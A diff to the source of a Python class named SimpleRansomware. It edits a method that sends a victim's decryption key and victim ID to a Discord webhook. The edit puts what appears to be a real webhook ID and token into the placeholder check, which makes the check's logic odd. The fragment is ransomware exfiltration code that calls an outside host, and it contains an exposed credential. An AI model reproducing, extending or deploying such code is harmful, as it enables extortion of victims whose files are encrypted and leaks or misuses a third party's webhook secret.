@@ -602,7 +602,7 @@ class SimpleRansomware:
         """Send the decryption key and victim ID to Discord channel using webhook"""
         try:
             # Check if webhook URL is configured
-            if self.webhook_url == "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN":
+            if self.webhook_url == "https://discord.com/api/webhooks/1500756942547587093/jymS7ouJAMxuogYBoHGhiDQIrlAz92p-vYs1eoA7RFyue6jt0YN0zDnXzqD7Xb1Kzyy-":
                 log_message("Discord webhook not configured, skipping key message")
                 return False
             
